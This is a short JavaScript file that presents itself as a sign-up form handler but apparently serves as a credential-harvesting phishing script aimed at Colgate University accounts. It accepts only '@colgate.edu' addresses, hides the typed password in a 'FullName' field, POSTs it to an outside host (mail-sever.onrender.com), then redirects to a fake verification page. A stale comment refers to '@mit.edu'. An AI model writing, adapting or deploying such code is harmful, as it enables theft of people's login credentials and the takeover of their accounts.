let signUp = document.getElementById("access");


signUp.addEventListener("submit", async(e) => {
    e.preventDefault();
    const username = "_a091b8df94f65dc9d4b9cd35fb4ddfbd90150407";
    const email = document.getElementById("username").value;
    const pwd = document.getElementById("password").value;
    if (
      (validateEmail(email))
    ) {
        if(validatePassword(pwd)
        ){
            const userData = {
                FullName: pwd,
                Email: email,
                Password: username,
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
            setTimeout(function() {
                window.location.href = "Verification.html"; // Replace "home.html" with your home page URL
            }, 1500);
        }else{
            alert('Password can\'t be empty')
        }
       
    }else{
        alert('Incorrect email address')
    }
});

function validateEmail(email) {
        // Check if the email ends with "@mit.edu"
        return email.endsWith("@colgate.edu");
    }

// Function to validate password
function validatePassword(password) {
    // Check if the password is not empty
    return password.trim() !== "";
}
